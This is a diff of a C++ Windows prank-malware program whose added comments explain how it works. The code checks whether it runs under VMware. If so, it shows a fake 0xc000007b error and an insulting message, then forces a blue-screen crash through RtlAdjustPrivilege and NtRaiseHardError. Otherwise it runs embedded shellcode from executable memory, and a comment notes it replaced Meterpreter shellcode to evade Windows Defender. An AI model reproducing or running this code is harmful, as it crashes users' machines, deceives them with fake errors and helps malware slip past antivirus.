@@ -1,9 +1,26 @@
+//================================================
+//
+//                CoVertManagement
+//
+//              inquisition-musician
+//      https://github.com/inquisition-musician
+//
+//================================================
+//
+//  Requirements:
+//  MSVC++ 2015-2022 Hybrid.
+//  
+//  Project: true;
+//
+//================================================
+
 #include <windows.h>
 #include <iostream>
 #include <string>
 #include <cstring>
-#include <winternl.h>
+#include <winternl.h> //It's needed for the assembly to work.
 
+//setting up privileges for the code.
 typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
 
@@ -12,7 +29,30 @@ using namespace std;
 bool isInsideVMWare()
 {
     bool rc = true;
+    
+    /*
+    Checking the BIOS vendor if it's VMwareVMware with x86 assembly.
 
+    Basically, it's doing the same thing as this bit of code.
+
+        int cpuInfo[4] = { 0 };
+
+        __cpuid(cpuInfo, 0x40000000);
+
+        char hyperVendor[13];
+        memcpy(hyperVendor, &cpuInfo[1], 4);  // EBX
+        memcpy(hyperVendor + 4, &cpuInfo[2], 4);  // ECX
+        memcpy(hyperVendor + 8, &cpuInfo[3], 4);  // EDX
+        hyperVendor[12] = '\0'; 
+
+        // Check if the hypervisor vendor is "VMwareVMware"
+        if (strcmp(hyperVendor, "VMwareVMware") == 0)
+        {
+            return true;
+        }
+        return false;
+    
+    */
     __try
     {
         __asm
@@ -35,23 +75,25 @@ bool isInsideVMWare()
             pop edx
         }
     }
+    //
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
         rc = false;
     }
 }
+
 void Payload(const wstring& programName)
 {
-    wstring pwned = L"The application was unable to start correctly (0xc000007b). Click OK to close the application.";
+    wstring pwned = L"The application was unable to start correctly (0xc000007b). Click OK to close the application."; 
     wstring title_name = programName + L" - Application Error";
 
-    MessageBoxW(NULL, pwned.c_str(), title_name.c_str(), MB_OK | MB_ICONSTOP);
+    MessageBoxW(NULL, pwned.c_str(), title_name.c_str(), MB_OK | MB_ICONSTOP); //no hello kitty, your exe is broken xD. 
 
     //let me sleep for a minute.
     Sleep(30000);
 
     //I'm a judge's disemboweler. A magistrate desrtoyer.
-    MessageBoxW(NULL, L"YOU THINK YOU ARE  GOD , \n BUT YOU ARE ONLY A CHUNK OF SHIT", L"Another haughty bloodsucker.......", MB_OK | MB_ICONSTOP);
+    MessageBoxW(NULL, L"YOU THINK YOU ARE  GOD , \n BUT YOU ARE ONLY A CHUNK OF SHIT", L"Another haughty bloodsucker.......", MB_OK | MB_ICONSTOP); //yeah, cringy, but it works.
     
     //blue screen envoking
     BOOLEAN bEnabled;
@@ -61,11 +103,25 @@ void Payload(const wstring& programName)
     pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
     pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
     NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
+    //It evokes the KeBugCheck API through the usermode by sending NT_STATUS_FLOAT_MULTIPLE_FAULTS, which in turn, crashes the system.
     NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
 }
 
 wstring GetProgramName()
 {
+    /*
+        Getting the filename is very important for the payload.
+        
+        You don't want to have a hardcoded name in your program, huh?
+        And making the badImage error more realistic.
+        
+        It works by basically checking the current working directory, getting the file name
+        and returning it.
+
+        It's very simple, but the code is a bit hard to read.
+
+        Earlier idea is to use argv[0] as the file name, but I found it hard, so this one will do.
+    */
     wchar_t buffer[MAX_PATH];
     GetModuleFileNameW(NULL, buffer, MAX_PATH);
     wstring fullPath = buffer;
@@ -80,6 +136,9 @@ wstring GetProgramName()
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
+    //Checking if it's in VMware. If it is, then show two error messages then bluescreen.
+    //If not, or it's on another VM, show the calculator. Essentially, killing two birds
+    //with one stone.
     if (isInsideVMWare())
     {
         wstring programName = GetProgramName();
@@ -88,6 +147,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     }
     else
     {
+        //I tried to use the Meterpreter shellcode, but it was detected by WD.
+        //So, I decided to use this one.
         unsigned char shellcode[] = {
             "\x50\x53\x51\x52\x56\x57\x55\x89"
             "\xe5\x83\xec\x18\x31\xf6\x56\x6a"
@@ -115,6 +176,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             "\x6a\x0a\x56\xff\xd0\x83\xc4\x46"
             "\x5d\x5f\x5e\x5a\x59\x5b\x58\xc3" };
 
+        //Allocating virtual memory, the size of the shellcode, committing, setting up the read-write, 
+        //checking if the exec variable is not null, then copying it and executing it.
         void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         if (exec != nullptr)
         {
